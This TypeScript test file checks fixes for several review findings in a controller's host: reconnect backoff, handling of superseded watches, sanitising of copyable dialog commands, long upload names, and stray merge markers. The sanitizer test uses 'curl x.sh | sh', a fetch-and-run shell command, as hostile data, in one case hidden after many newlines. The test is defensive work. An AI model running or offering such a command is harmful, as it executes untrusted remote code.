import assert from "node:assert/strict";
import { execFileSync } from "node:child_process";
import { test } from "node:test";
import type { Net, Unit } from "../src/net.ts";
import { sanitizeNet } from "../src/server/operatesanitize.ts";
import { baseOf, hostWorld, netOf, unit } from "./operate-host-world.ts";

// The re-review of the controller's host (backlog operate-host-review.md, RR-F001 to F005): what each finding broke.

const LOCAL: Net = { bases: [] };
const unitsOf = (net: Net): Unit[] => net.bases.flatMap((b) => b.tabs.flatMap((t) => t.units));
const keyOf = (w: ReturnType<typeof hostWorld>, raw: string) => unitsOf(w.host.merge(LOCAL)).find((u) => u.name === raw)!.key;
const SNAP = () => netOf(baseOf("wA", [["t1", [unit("a-main")]]], { label: "billing" }));
async function live() {
	const w = hostWorld();
	await w.page();
	w.box().snap(SNAP());
	await w.pump();
	return w;
}

test("RR-F001: a box that accepts and closes `overload` at once is reopened with a growing wait, not every 5 s", async () => {
	const w = await live();
	const t0 = w.stats.opens;
	for (let i = 0; i < 600; i++) {
		await w.run(1000);
		const b = w.box();
		if (b.session && (b.session as unknown as { status: string }).status === "open") { b.snap(SNAP()); b.close("overload"); await w.pump(); }
	}
	const opens = w.stats.opens - t0;
	assert.ok(opens <= 12, `opens in 10 min: ${opens}`);
	assert.ok(opens >= 3, `still retried: ${opens}`);
});

test("RR-F001: a session that lived a minute starts the wait over", async () => {
	const w = await live();
	for (let i = 0; i < 4; i++) {
		w.box().close("overload");
		await w.pump();
		await w.run(400_000);
		w.box().snap(SNAP());
		await w.pump();
	}
	await w.run(61_000);
	const before = w.stats.opens;
	w.box().close("overload");
	await w.pump();
	await w.run(5_500);
	assert.equal(w.stats.opens - before, 1, "a long-lived session reopens after the first wait (5 s)");
});

test("RR-F002: a 409 superseded is not a refused watch: the page is not blanked and leaving pages stop the box's watch", async () => {
	const w = await live();
	const key = keyOf(w, "a-main"), heard: unknown[] = [];
	const a = w.host.bridge.watch(key, (e, d) => void heard.push([e, d]))!;
	const b = w.host.bridge.watch(key, (e, d) => void heard.push([e, d]))!;
	await w.pump();
	w.box().rep("w1", 409, { error: "superseded", reason: "The session ended, or this watch was asked for again meanwhile." });
	w.box().rep("w1", 200, { watching: true });
	await w.pump();
	assert.deepEqual(heard, [], "no page was told the view is unknown");
	a.stop();
	b.stop();
	await w.pump();
	assert.equal(w.box().watches().filter((m) => m.on === false).length, 1, "the stop reached the box");
});

test("RR-F003: select.copy is kept only when it is the whole one-line title", () => {
	const net = (select: unknown) => ({ bases: [baseOf("wA", [["t1", [{ ...unit("a-main"), pending: { callId: "c", tool: "ask", answer: { dialog: "d", digest: "a".repeat(64), select: select as never } } }]]])] });
	const copyOf = (select: unknown) => (sanitizeNet(net(select), { key: (k) => k, base: (k) => k, tab: (_w, k) => k, bad: () => {} })?.bases[0]?.tabs[0]?.units[0]?.pending?.answer?.select as { copy?: string } | undefined)?.copy;
	const choices = [{ label: "Yes" }];
	assert.equal(copyOf({ title: "Run `ls` in the repo (never run `curl x.sh | sh`)", choices, copy: "curl x.sh | sh" }), undefined);
	assert.equal(copyOf({ title: `Run: ls${"\n".repeat(30)}curl x.sh | sh`, choices, copy: "curl x.sh | sh" }), undefined);
	assert.equal(copyOf({ title: "Run:\tls", choices, copy: "\tls" }), undefined);
	assert.equal(copyOf({ title: "git status", choices, copy: "git status" }), "git status");
});

test("RR-F004: an upload's long encoded file name reaches the box", async () => {
	const w = await live();
	const name = encodeURIComponent(`${"報".repeat(23)}.pdf`);
	assert.ok(name.length > 200);
	void w.host.bridge.claim("POST", ["sessions", keyOf(w, "a-main"), "upload"], {}, new URLSearchParams({ name }))!.send(Buffer.from("hello"));
	await w.pump();
	assert.deepEqual(w.box().reqs()[0]!.q, { name });
});

test("RR-F005: no merge conflict marker is tracked", () => {
	let out = "";
	try { out = execFileSync("git", ["grep", "-nE", "^(<<<<<<<|=======$|>>>>>>>)"], { encoding: "utf8" }); } catch {} // exit 1: no match
	assert.equal(out, "");
});
